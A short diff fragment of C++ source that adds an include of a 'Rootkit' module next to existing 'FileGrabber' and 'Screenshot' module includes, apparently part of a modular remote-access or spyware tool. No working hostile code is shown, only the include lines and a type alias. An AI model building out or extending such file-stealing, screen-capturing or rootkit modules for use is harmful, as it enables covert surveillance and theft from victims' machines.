@@ -5,6 +5,7 @@
 #include "BaseModule.h"
 #include "../Modules/FileGrabber.h"
 #include "../Modules/Screenshot.h"
+#include "../Modules/Rootkit.h"
 
 using supported_modules = supported_modules_enum;
 
